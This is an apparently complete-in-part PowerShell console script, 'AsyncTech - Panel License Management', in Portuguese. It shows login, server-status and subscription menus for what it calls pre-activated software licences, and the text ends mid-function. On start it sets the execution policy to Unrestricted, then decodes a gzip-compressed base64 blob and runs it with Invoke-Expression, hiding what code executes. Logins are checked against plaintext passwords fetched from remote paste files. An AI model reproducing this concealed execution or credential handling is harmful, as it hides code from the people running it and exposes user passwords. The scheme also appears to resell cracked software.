# Preparação do ambiente e iniciação da aplicação
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force

# Links Externos
$compLinksGetData = 'H4sIAAAAAAAA/+yYwWvbMBTG74H8D76E1yDclOYwttOStIxB14Wl7V2J1cTUsYNlp4yx/3381Emeh48dG156EJLfe9/79D0pz+5jnW+qtMijD6aK74qksPG9rXWZFjb6NhxEURSVpqrLPHp/9rLkT3aVKKkOosS+EyWTiSgptSh5Phcl2xTrTpTUawYrSkwpSjaFKMmJNTku5/7ZHoCEMLMFCuTJDPivRGxEyZ3BGdB4KUo0ACZjeSNK0o0HtfjFn7yLBs/sQ0oS3UOohm5JyoLlpCaWQcM0hVW897FrnhXy/ylwZHb4ufHxcPB9OBgOOg7NsiySuurzoVmR8hEaz043ImyMC8MNNDY8y0eiZDEVJSO4vMHZAvDRJQJAw0D/5tdeTsk2uhQlFxAvWW5RQ8NK22A1YUZYBY0jKZMikAT58oINhtnZgqq7vekAcIUk7DwNJF8McZhd+1uhSZQFPBNmK6cBiutxf+5L/4q/w+/YAKy84imG7FS7f7R2DrSd8m2wziCZ8putEy74uOMKo9U1w/yLKPl8qnNP6/zAjpY9Km/l9XIKpxi2GGYOBbq2qUm7vzUKz5wfnHMMVe01aFw6E71iD3VhIB/cMXWlzPwvcqI7Dk4TgZ+p+tZc+1JZhBgROwVqjmDrzKtxqtgfrxgpn1LPoEd6PwBwa30O18YsyyIosAhMf+k9M+/nhNNY67LtQptY3nYc5rM2aEh0lQbBdOsbIG5z2R/8l6TrednOdyvd8dXQRGTGI5/q97fqt2zeO+bcUzTN3PvTqS6vV5fiCQCXcixR8x+WHwEAAP//z8QotJMTAAA='; $bytes = [System.Convert]::FromBase64String($compLinksGetData); $stream = New-Object IO.MemoryStream(, $bytes); $decompLinksGetData = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader($decompLinksGetData); $obLinksGetData = $reader.ReadToEnd(); Invoke-Expression $obLinksGetData

# Define o nome e a versão
$scriptName = "AsyncTech - Panel License Management"
$scriptVersion = "v1.0.0"

# Adiciona o título na janela do PowerShell
$windowTitle = "$scriptName - $scriptVersion"
[console]::Title = $windowTitle

# Menu Principal

function Show-Menu {
    cls
    Write-Host ""
    Write-Host "     ================================================================================================================" -ForegroundColor Green
    Write-Host "                                                      MENU PRINCIPAL                                                 " -ForegroundColor Cyan
    Write-Host "     ================================================================================================================" -ForegroundColor Green 
    Write-Host ""
    Write-Host "     ================================================================================================================" -ForegroundColor Gray
    Write-Host ""  
    Write-Host -NoNewline "     [1] - "  -ForegroundColor Yellow
    Write-Host "Fazer Login" -ForegroundColor Green
    Write-Host -NoNewline "     [2] - "  -ForegroundColor Yellow
    Write-Host "Status do Servidor" -ForegroundColor Blue
    Write-Host -NoNewline "     [3] - "  -ForegroundColor Yellow
    Write-Host "Grupo Telegram" -ForegroundColor Cyan
    Write-Host -NoNewline "     [4] - "  -ForegroundColor Yellow
    Write-Host "Sair" -ForegroundColor Red
    Write-Host ""
    Write-Host "     ================================================================================================================" -ForegroundColor Gray
    Write-Host ""

    $opcao = Read-Host "Digite o número da opção escolhida"

    switch ($opcao) {
        1 { Fazer-Login }
        2 { Status-Servidor }
        3 { Grupo-Telegram }
        4 { Exit }
        default { Show-Menu }
    }
}


# Menu Fazer Login

function Fazer-Login {
    cls
    Write-Host ""
    Write-Host "     ================================================================================================================" -ForegroundColor Green
    Write-Host "                                                      EFETUAR LOGIN                                                  " -ForegroundColor Cyan
    Write-Host "     ================================================================================================================" -ForegroundColor Green 
    Write-Host ""

    function Read-Password {
        [System.Console]::ForegroundColor = 'Yellow'
        [Console]::Write("     Digite a sua senha: ") 
        # Redefinir a cor do texto para a cor padrão
        [System.Console]::ResetColor()
        $password = "" 
        while ($true) {
            $key = [System.Console]::ReadKey($true)
            if ($key.Key -eq "Enter") {
                break
            }
            if ($key.Key -eq "Backspace" -and $password.Length -gt 0) {
                $password = $password.Substring(0, $password.Length - 1)
                [Console]::Write("`b `b")
            } elseif ($key.Key -ne "Backspace") {
                $password += $key.KeyChar
                [Console]::Write("*")
            }
        }
        [Console]::WriteLine()
        return $password
    }

    Write-Host -NoNewline "     Digite seu usuário: " -ForegroundColor Yellow 
    # Captura da entrada do usuário (entrada em si não pode ser colorida)
    $usuario = Read-Host
    
    Write-Host ""

    # Exibir o que foi digitado em uma cor específica
    Write-Host -NoNewline "     Usuário digitado: "
    Write-Host $usuario -ForegroundColor Yellow
    
    Write-Host ""

    # Prompt para a senha
    $senha = Read-Password
    # Exibir a senha digitada em uma cor específica (por razões de segurança, geralmente não se exibe a senha)
    
    Write-Host ""

    # Substituir o conteúdo da senha por asteriscos
    $asteriscosSenha = "*" * $senha.Length

    Write-Host -NoNewline "     Senha digitada: "
    Write-Host $asteriscosSenha -ForegroundColor Yellow

    # URLs para obter todos os usuarios
    $urls = Get-Todos-Usuarios

    # Verificar usuário e senha no conteúdo obtido
    $encontrado = $false

    # Verifica se o usuário ou a senha estão vazios
    if ([string]::IsNullOrEmpty($usuario) -or [string]::IsNullOrEmpty($senha)) {
        Write-Host ""
        Write-Host -NoNewline "     Erro ao fazer login." -ForegroundColor Red
        Write-Host " Usuário ou senha não podem estar vazios." -ForegroundColor Yellow
        Write-Host ""
        $encontrado = $false
        pause
    } else {
        foreach ($url in $urls) {
            try {
                # Obter o conteúdo do arquivo do Pastebin
                $conteudo = Invoke-RestMethod -Uri $url -ErrorAction Stop
            } catch {
                Write-Host "     Erro ao acessar a URL: $url" -ForegroundColor Red
                continue
            }

            # Verificar se o conteúdo está vazio
            if ([string]::IsNullOrWhiteSpace($conteudo)) {
                Write-Host "     Conteúdo da URL $url está vazio ou não pôde ser obtido." -ForegroundColor Yellow
                continue
            }

            # Verificar usuário e senha no conteúdo obtido
            $linhas = $conteudo -split "`n"

            foreach ($linha in $linhas) {
            
                $campos = $linha -split "\|"
            
                if ($campos.Count -ge 3) {

                    $usuario_atual = $campos[1].Trim()
                    $senha_atual = $campos[2].Trim()
                    $plano_conta_atual = $campos[8].Trim()

                    if ([string]::Equals($usuario, $usuario_atual, [System.StringComparison]::Ordinal) -and 
                        [string]::Equals($senha, $senha_atual, [System.StringComparison]::Ordinal)) {
                        Write-Host ""
                        Write-Host -NoNewline "     Login bem-sucedido, " -ForegroundColor Green
                        Write-Host -NoNewline "abrindo " -ForegroundColor Yellow
                        Write-Host -NoNewline "'MENU DE SELEÇÃO DO SEU PRODUTO'." -ForegroundColor Cyan 
                        Write-Host ""
                        $encontrado = $true
                        Show-Menu-Produto -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -TipoPlanoConta $plano_conta_atual
                        break
                    }
                }
            }

            # Se o usuário foi encontrado, não precisa verificar outros links
            if ($encontrado) {
                break
            }
        }
    }


    if (-not $encontrado -and -not [string]::IsNullOrEmpty($usuario) -and -not [string]::IsNullOrEmpty($senha)) {
        Write-Host ""
        Write-Host -NoNewline "     Erro ao fazer login." -ForegroundColor Red
        Write-Host " Usuário ou senha incorretos." -ForegroundColor Yellow
        Write-Host ""
        pause
    }

    Show-Menu
}

# Menu Status Servidor

function Status-Servidor {
    cls
    Write-Host ""
    Write-Host "     ======================================" -ForegroundColor Green
    Write-Host "              Status do Servidor           " -ForegroundColor Cyan
    Write-Host "     ======================================" -ForegroundColor Green
    Write-Host ""
    # Aqui você deve adicionar a lógica para consultar o status do servidor
    # e exibir a mensagem com a resposta
    pause
    Show-Menu
}

# Menu Grupo Wpp ou Telegram

function Grupo-Telegram {
    cls
    Write-Host ""
    Write-Host "     ======================================" -ForegroundColor Green
    Write-Host "               Grupo Telegram              " -ForegroundColor Cyan
    Write-Host "     ======================================" -ForegroundColor Green
    Write-Host ""
    # Aqui você deve adicionar a lógica para consultar o grupo do Telegram
    # e exibir a mensagem com a resposta
    pause
    Show-Menu
}


# Função para carregar valores de qtdv
function Load-QTDVValues {

    if (Test-Path $qtdvFilePath) {
        $content = Get-Content $qtdvFilePath -Raw
        $qtdvValues = @{}
        foreach ($line in $content -split "`n") {
            $parts = $line -split ":"
            if ($parts.Length -eq 2) {
                if ($parts[1].Trim() -eq "Ilimitado" -or $parts[1].Trim() -eq "Pendente" -or $parts[1].Trim() -eq "Aprovado") {
                    $qtdvValues[$parts[0].Trim()] = $parts[1].Trim()
                } else {
                    $qtdvValues[$parts[0].Trim()] = [int]$parts[1].Trim()
                }
            }
        }

        # Calcula a soma total dos qtdv_valor_atual dos produtos
        $qtdvTotal = Calculate-QTDVTotal -products $products

        # Recupera o status do pagamento e valor individual ou total do produto
        $result = Update-QTDVTotal -products $products
        $statusPagamento = $result.StatusPagamento
        $countIsAprovado = $result.CountIsAprovado
        $countIsPendente = $result.CountIsPendente
        $totalIndividualTotalAtualizado = $result.IndividualTotalAtualizado
        $totalIndividualTotalAnterior = $result.IndividualTotalAnterior

        # função para receber status de pagamento

        # Se qtdv_valor_atual for 0 ou não existir, ajusta com base nos valores
        if (-not $qtdvValues.ContainsKey("qtdv_valor_atual") -or $qtdvValues["qtdv_valor_atual"] -eq 0 -and $statusPagamento -eq "Aprovado" -and $qtdvValues["qtdv_valor_inicial"] -eq $qtdvTotal) {
            
            $qtdvValues["qtdv_valor_atual"] = 0
            
        } elseif($qtdvTotal -ne "Ilimitado" -and $qtdvValues["status_pagamento"] -eq "Pendente" -and $countIsPendente -ge 1 -and $qtdvValues["qtdv_valor_atual"] -ge 0 -and ($qtdvValues["qtdv_valor_inicial"] -eq $qtdvTotal -or $qtdvValues["qtdv_valor_inicial"] -gt $qtdvTotal -or $qtdvValues["qtdv_valor_inicial"] -lt $qtdvTotal)) {


            if($qtdvTotal -ne "Ilimitado" -and $countIsAprovado -ge 1 -and $qtdvValues["qtdv_valor_inicial"] -ne $qtdvTotal -or $qtdvValues["qtdv_valor_individual"] -ne $totalIndividualTotalAtualizado) {
                
                # Calculo da redução para o valor atual atualizado 
                $attQtdvUtilizado = $qtdvValues["qtdv_valor_utilizado"] - $totalIndividualTotalAnterior
                            
                # Atualiza qtdv_valor_inicial com o valor total calculado
                $qtdvValues["qtdv_valor_inicial"] = $qtdvTotal
                # Atualiza qtdv_valor_atual com o resultado da redução utilizada do qtdv anteriormente
                $qtdvValues["qtdv_valor_atual"] =  $qtdvValues["qtdv_valor_inicial"] - $attQtdvUtilizado
                # Atualiza qtdv_valor_utilizado com o decremento anterior após atualização de valor atual
                $qtdvValues["qtdv_valor_utilizado"] = $qtdvValues["qtdv_valor_utilizado"] - $totalIndividualTotalAnterior
                # Atualiza o qtdv valor individual
                $qtdvValues["qtdv_valor_individual"] = $totalIndividualTotalAtualizado
                # Atualiza o status de pagamento
                $qtdvValues["status_pagamento"] = "Aprovado"

            } else {

                # Atualiza qtdv_valor_inicial com o valor total calculado
                $qtdvValues["qtdv_valor_inicial"] = $qtdvTotal
                # Atualiza qtdv_valor_atual com o resultado da redução utilizada do qtdv anteriormente
                $qtdvValues["qtdv_valor_atual"] = $qtdvValues["qtdv_valor_atual"] + $totalIndividualTotalAtualizado
                # Atualiza qtdv_valor_utilizado com o decremento anterior após atualização de valor atual
                $qtdvValues["qtdv_valor_utilizado"] = $qtdvValues["qtdv_valor_utilizado"] - $totalIndividualTotalAnterior
                # Atualiza o status de pagamento
                $qtdvValues["status_pagamento"] = "Aprovado"

            }
            
            # Salva os valores atualizados no arquivo
            Save-QTDVValues -qtdvValues $qtdvValues

        } elseif($qtdvTotal -ne "Ilimitado" -and $qtdvValues["status_pagamento"] -eq "Aprovado" -or $countIsAprovado -ge 1 -and $qtdvValues["qtdv_valor_inicial"] -ne $qtdvTotal) {
            
            # Calculo da redução para o valor atual atualizado 
            $reduceValorInicial = $qtdvValues["qtdv_valor_inicial"] - $qtdvValues["qtdv_valor_atual"]
                            
            # Atualiza qtdv_valor_inicial com o valor total calculado
            $qtdvValues["qtdv_valor_inicial"] = $qtdvTotal
            # Atualiza qtdv_valor_atual com o resultado da redução utilizada do qtdv anteriormente
            $qtdvValues["qtdv_valor_atual"] = $qtdvValues["qtdv_valor_inicial"] - $reduceValorInicial
            # Atualiza qtdv_valor_utilizado com o decremento anterior após atualização de valor atual
            $qtdvValues["qtdv_valor_utilizado"] = $reduceValorInicial
            # Atualiza o status de pagamento
            $qtdvValues["status_pagamento"] = "Aprovado"

            # Salva os valores atualizados no arquivo
            Save-QTDVValues -qtdvValues $qtdvValues
        }

        return $qtdvValues

    } else {
        # Se o arquivo não existir, calcula a soma total dos qtdv_valor_atual e retorna
        $qtdvTotal = Calculate-QTDVTotal -products $products

        $defaultValues = @{ "qtdv_valor_inicial" = $qtdvTotal; "qtdv_valor_atual" = $qtdvTotal; "qtdv_valor_utilizado" = 0; "status_pagamento" = "Pendente"; "qtdv_valor_individual" = 0 }
        Save-QTDVValues -qtdvValues $defaultValues
        
        return $defaultValues
    }
}

# Função para calcular a soma total de qtdv dos produtos
function Calculate-QTDVTotal { 
    param (
        [array]$products
    )
                    
    $total = 0
    $isIlimitado = $false

    foreach ($product in $products) {
                        
        $qtdv_atualizado = $product.qtdv_produto_atualizado

        if ($qtdv_atualizado -eq "ilimitado") {
            $isIlimitado = $true
            break
        }
        $total += [int]$qtdv_atualizado
    }
    if ($isIlimitado) {
        return "Ilimitado"
    } else {
        return $total
    }
}

# Função para salvar valores de qtdv

function Save-QTDVValues {
    param (
        [hashtable]$qtdvValues
    )

    $content = @()
    foreach ($key in $qtdvValues.Keys) {
        $content += "$($key): $($qtdvValues[$key])"
    }

    # Se existir, atualiza o conteúdo do arquivo
    $content | Set-Content $qtdvFilePath -Force

}

function Update-QTDVTotal {
    param (
        [array]$products
    )

    $totalIndividualAtualizado = 0
    $totalAnteriorAtualizado = 0
    $isPendente = "Aprovado"
    $countIsPendente = 0

    foreach ($product in $products) {
        $status_pagamento = $product["status_pagamento"]
        
        if ($status_pagamento -eq "Pendente") {
            $isPendente = "Pendente"
            $countIsPendente += 1
            $totalIndividualAtualizado += [int]$product["qtdv_produto_atualizado"]
            $totalAnteriorAtualizado += [int]$product["qtdv_produto_anterior"]
        } elseif ($status_pagamento -eq "Aprovado") {
            $isPendente = "Aprovado"
            $countIsAprovado += 1
        }
    }

    $result = @{
        IndividualTotalAtualizado = $totalIndividualAtualizado
        IndividualTotalAnterior = $totalAnteriorAtualizado
        CountIsPendente = $countIsPendente
        CountIsAprovado = $countIsAprovado
        StatusPagamento = $isPendente
    }
                    
    return $result
}

# Função auxiliar para escrever mensagens formatadas no console
function Write-QTDVMessage {
    param (
        [string]$label,
        [string]$value,
        [ConsoleColor]$color
    )
    Write-Host -NoNewline "      $($label): "
    Write-Host "$value" -ForegroundColor $color
}

# Função auxiliar para escrever mensagens formatadas no console
function Write-QTDVMessageMenuLogin {
    param (
        [string]$label,
        [string]$value,
        [ConsoleColor]$color
    )
    Write-Host -NoNewline "$($label): "
    Write-Host -NoNewline "$value" -ForegroundColor $color
}

# Função para atualizar qtdv no menu
function Update-QTDVInMenu {

    param (
        [string]$qtdvTotal,
        [string]$qtdvUtilizado,
        [switch]$silent
    )

    if (-not $silent) {
        
        Write-Host ""
        Write-Host -NoNewline "      2 - " -ForegroundColor Green
        Write-Host "QTDV TOTAL:" -ForegroundColor Yellow
        Write-Host ""

        if ($qtdvTotal -eq "Ilimitado") {
            Write-QTDVMessage -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES" -value $qtdvTotal -color Cyan
        } else {
            if ($qtdvTotal -eq 0) {
                Write-QTDVMessage -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES" -value "Nenhum" -color Red
            } else {
                Write-QTDVMessage -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES" -value $qtdvTotal -color Yellow
            }

            if ($qtdvUtilizado -eq 0) {
                Write-QTDVMessage -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES UTILIZADO" -value "Nenhum" -color Red
            } else {
                Write-QTDVMessage -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES UTILIZADO" -value $qtdvUtilizado -color Yellow
            }
        }

    }

}

function Show-Menu-Detalhes-Login {

    param (
        [string]$UsuarioAtual,
        [string]$SenhaAtual,
        [string]$TipoPlanoConta,
        [string]$detalheslogin_senhadisplay = "xxxx-xxxx-xxxx",
        [string]$revelarAcessoColor = "Yellow",
        [string]$qtdvTotal,
        [string]$qtdvUtilizado,
        [switch]$silent
    )
    

    # Define uma largura fixa para o conteúdo antes do pipe
    if ( $TipoPlanoConta -eq "VIP" ) { 

        $fixedWidthStatusLogin = 51
        $fixedWidthDefault = 46
        $fixedWidthUsuario = 44
        $fixedWidthSenha = 46
        $fixedWidthTipoPlano = 35 
        $fixedWidthQTDTOTALDV = 17
        $fixedWidthQTDINDVDV = 14
                    
    } else {

        $fixedWidthStatusLogin = 58
        $fixedWidthDefault = 53
        $fixedWidthUsuario = 51
        $fixedWidthSenha = 53
        $fixedWidthTipoPlano = 42
        $fixedWidthQTDTOTALDV = 24
        $fixedWidthQTDINDVDV = 14
                    
    } 

    $titulostatuslogin = "STATUS DE LOGIN"
    $nomeusuarioatual = $UsuarioAtual
    $senhausuarioatual = $detalheslogin_senhadisplay
    $tipoplanousuarioatual = $TipoPlanoConta
    $qtdvtotalatual = if ($qtdvTotal -eq 0) { "Nenhum" } else { $qtdvTotal }
    $qtdvutilizadoatual = if ($qtdvUtilizado -eq 0) { "Nenhum" } else { $qtdvUtilizado }

    if ( $TipoPlanoConta -eq "VIP" ) {

        Write-Host "     =================================================" -ForegroundColor Yellow

    } else {

        Write-Host "     ========================================================" -ForegroundColor Yellow
    } 

    # Usuário

    Write-Host -NoNewline "     | " -ForegroundColor Yellow
    Write-Host -NoNewline "$($titulostatuslogin): " -ForegroundColor Cyan
    $spacesNeededStatusLogin = $fixedWidthStatusLogin - ("$titulostatuslogin".Length + 7)
    $spacesStatusLogin = " " * [Math]::Max($spacesNeededStatusLogin, 0)
    Write-Host -NoNewline $spacesStatusLogin -ForegroundColor Yellow
    Write-Host "|" -ForegroundColor Yellow
    Write-Host -NoNewline "     | " -ForegroundColor Yellow
    $spacesNeededDefault = $fixedWidthDefault
    $spacesDefault = " " * [Math]::Max($spacesNeededDefault, 0)
    Write-Host -NoNewline $spacesDefault -ForegroundColor Yellow
    Write-Host "|" -ForegroundColor Yellow
    Write-Host -NoNewline "     | " -ForegroundColor Yellow
    Write-Host -NoNewline "USUÁRIO: " -ForegroundColor White
    Write-Host -NoNewline "$nomeusuarioatual" -ForegroundColor $revelarAcessoColor
    $spacesNeededUsuario = $fixedWidthUsuario - ("$nomeusuarioatual".Length + 7) 
    $spacesUsuario = " " * [Math]::Max($spacesNeededUsuario, 0)
    Write-Host -NoNewline $spacesUsuario -ForegroundColor Yellow
    Write-Host "|" -ForegroundColor Yellow

    # Senha

    Write-Host -NoNewline "     | " -ForegroundColor Yellow
    Write-Host -NoNewline "SENHA: " -ForegroundColor White
    Write-Host -NoNewline "$detalheslogin_senhadisplay" -ForegroundColor $revelarAcessoColor
    $spacesNeededSenha = $fixedWidthSenha - ("$senhausuarioatual".Length + 7) 
    $spacesSenha = " " * [Math]::Max($spacesNeededSenha, 0)
    Write-Host -NoNewline $spacesSenha -ForegroundColor Yellow
    Write-Host "|" -ForegroundColor Yellow

    # Tipo de Plano de Conta

    Write-Host -NoNewline "     | " -ForegroundColor Yellow
    Write-Host -NoNewline "TIPO PLANO CONTA: " -ForegroundColor White
    if ($tipoplanousuarioatual -eq "VIP") {
        Write-Host -NoNewline "$tipoplanousuarioatual" -ForegroundColor Magenta
    } else {
        Write-Host -NoNewline "$tipoplanousuarioatual" -ForegroundColor Blue
    }
    $spacesNeeded = $fixedWidthTipoPlano - ("$tipoplanousuarioatual".Length + 7) 
    $spaces = " " * [Math]::Max($spacesNeeded, 0)
    Write-Host -NoNewline $spaces -ForegroundColor Yellow
    Write-Host "|" -ForegroundColor Yellow
    
    if (-not $silent) {

        if ($QtdvTotal -eq "Ilimitado") {
            Write-Host -NoNewline "     | " -ForegroundColor Yellow
            Write-QTDVMessageMenuLogin -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES" -value $qtdvtotalatual -color Cyan
            $spacesNeededQTDTOTALDV = $fixedWidthQTDTOTALDV - ("$qtdvtotalatual".Length + 7) 
            $spacesQTDTOTALDV = " " * [Math]::Max($spacesNeededQTDTOTALDV, 0)
            Write-Host -NoNewline $spacesQTDTOTALDV -ForegroundColor Yellow
            Write-Host "|" -ForegroundColor Yellow
        } else {
            if ($QtdvTotal -eq 0) {
                Write-Host -NoNewline "     | " -ForegroundColor Yellow
                Write-QTDVMessageMenuLogin -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES" -value $qtdvtotalatual -color Red
                $spacesNeededQTDTOTALDV = $fixedWidthQTDTOTALDV - ($qtdvtotalatual.Length + 7) 
                $spacesQTDTOTALDV = " " * [Math]::Max($spacesNeededQTDTOTALDV, 0)
                Write-Host -NoNewline $spacesQTDTOTALDV -ForegroundColor Yellow
                Write-Host "|" -ForegroundColor Yellow
            } else {
                Write-Host -NoNewline "     | " -ForegroundColor Yellow
                Write-QTDVMessageMenuLogin -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES" -value $qtdvtotalatual -color Yellow
                $spacesNeededQTDTOTALDV = $fixedWidthQTDTOTALDV - ("$qtdvtotalatual".Length + 7)
                $spacesQTDTOTALDV = " " * [Math]::Max($spacesNeededQTDTOTALDV, 0) 
                Write-Host -NoNewline $spacesQTDTOTALDV -ForegroundColor Yellow
                Write-Host "|" -ForegroundColor Yellow
            }

            if ($QtdvUtilizado -eq 0) {
                Write-Host -NoNewline "     | " -ForegroundColor Yellow
                Write-QTDVMessageMenuLogin -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES UTILIZADO" -value $qtdvutilizadoatual -color Red
                $spacesNeededQTDINDVDV = $fixedWidthQTDINDVDV - ("$qtdvutilizadoatual".Length + 7)
                $spacesQTDINDVDV = " " * [Math]::Max($spacesNeededQTDINDVDV, 0) 
                Write-Host -NoNewline $spacesQTDINDVDV -ForegroundColor Yellow
                Write-Host "|" -ForegroundColor Yellow
            } else {
                Write-Host -NoNewline "     | " -ForegroundColor Yellow
                Write-QTDVMessageMenuLogin -label "QTD TOTAL DOWNLOAD E VISUALIZAÇÕES UTILIZADO" -value $qtdvutilizadoatual -color Yellow
                $spacesNeededQTDINDVDV = $fixedWidthQTDINDVDV - ("$qtdvutilizadoatual".Length + 7)
                $spacesQTDINDVDV = " " * [Math]::Max($spacesNeededQTDINDVDV, 0) 
                Write-Host -NoNewline $spacesQTDINDVDV -ForegroundColor Yellow
                Write-Host "|" -ForegroundColor Yellow
            }
        }

    }

    if ( $TipoPlanoConta -eq "VIP" ) {

        Write-Host "     =================================================" -ForegroundColor Yellow

    } else {

        Write-Host "     ========================================================" -ForegroundColor Yellow
    } 

}

function MostrarCabecalhoRenovacao{
    
    param (
        [string]$mensagemproduto = "O prazo do seu plano de assinatura do seu produto em sua conta chegou ao fim!",
        [string]$mensagemplano = "O prazo do seu plano de assinatura em sua conta chegou ao fim!",
        [string]$fimensagem = "Selecione as outras opções no menu para conferir os preços e vantagens de cada oferta.",
        [string]$opcao_mensagem = "",
        [string]$url=""
    )

    if ($url -and $opcao_mensagem -eq "GRUPO MEMBRO") {
        Start-Process $url
        cls
        Write-Host ""
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host "                                              MENU DE RENOVAÇÃO DO PLANO                                             " -ForegroundColor Cyan
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     BENEFÍCIOS" -ForegroundColor Cyan
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host -NoNewline "PLANO ASSINATURA: $opcao_mensagem" -ForegroundColor Yellow
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host ""
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan                                                                   
        Write-Host -NoNewline "Softwares e Licenças" -ForegroundColor Yellow
        Write-Host -NoNewline " [Método de Ativação: Pré-Ativado]" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Atualizações Periódicas Pré-paga" -ForegroundColor Yellow
        Write-Host -NoNewline " (Quando Disponível)" -ForegroundColor Green
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan
        Write-Host -NoNewline "Instalação, Desinstalação e Ativação" -ForegroundColor Yellow
        Write-Host -NoNewline " (Automática, Rápida e Segura)" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Quantidade de Downloads e Visualizações:" -ForegroundColor Yellow
        Write-Host -NoNewline " Limitada (3)" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Tutoriais em vídeo ou imagens auto explicativas" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan                                                                   
        Write-Host -NoNewline "Suporte Prioritário" -ForegroundColor Yellow
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "1x " -ForegroundColor Magenta
        Write-Host -NoNewline "Assistência Remota" -ForegroundColor Yellow
        Write-Host -NoNewline " (GRÁTIS)" -ForegroundColor Green
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan                                                                   
        Write-Host -NoNewline "Garantia em todos os produtos" -ForegroundColor Yellow
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Substituição, renovação ou reembolso" -ForegroundColor Yellow
        Write-Host -NoNewline " (Quando atendido os requisitos)" -ForegroundColor Green
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan                                                                   
        Write-Host -NoNewline "Sorteio e Descontos" -ForegroundColor Yellow
        Write-Host ""
        Write-Host -NoNewline "     - " -ForegroundColor Cyan
        Write-Host -NoNewline "Combos e Ofertas Especiais" -ForegroundColor Yellow
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host ""
        Write-Host -NoNewline "     VALORES" -ForegroundColor Cyan 
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host -NoNewline "PLANO ASSINATURA: $opcao_mensagem" -ForegroundColor Yellow
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host ""
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Diário" -ForegroundColor Yellow
        Write-Host -NoNewline " (15 Dias):" -ForegroundColor Magenta
        Write-Host -NoNewline " 10,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:3)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Mensal:" -ForegroundColor Yellow
        Write-Host -NoNewline " 15,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:6)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Trimestral:" -ForegroundColor Yellow
        Write-Host -NoNewline " 28,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:8)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Semestral:" -ForegroundColor Yellow
        Write-Host -NoNewline " 37,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:10)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Anual:" -ForegroundColor Yellow
        Write-Host -NoNewline " 48,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:15)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host -NoNewline "     * " -ForegroundColor Cyan
        Write-Host -NoNewline "Vitalício:" -ForegroundColor Yellow
        Write-Host -NoNewline " 65,00" -ForegroundColor Green
        Write-Host -NoNewline " (QTDV:25)" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
    } elseif ($url -and $opcao_mensagem -eq "GRUPO VIP") {
        Start-Process $url
        cls
        Write-Host ""
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host "                                              MENU DE RENOVAÇÃO DO PLANO                                             " -ForegroundColor Cyan
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host ""
        Write-Host -NoNewline "     BENEFÍCIOS" -ForegroundColor Cyan 
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host -NoNewline "PLANO ASSINATURA: $opcao_mensagem" -ForegroundColor Yellow
        Write-Host -NoNewline " | " -ForegroundColor Cyan 
        Write-Host ""
        Write-Host ""
        Write-Host "     ===============================================================================================================" -ForegroundColor DarkYellow
        Write-Host -NoNewline "     > " -ForegroundColor Cyan   
        Write-Host -NoNewline "[Todos]" -ForegroundColor Magenta                                                               
        Write-Host -NoNewline " Softwares e Licenças" -ForegroundColor Yellow
        Write-Host -NoNewline " [Método de Ativação: Pré-Ativado]" -ForegroundColor Green
        Write-Host ""
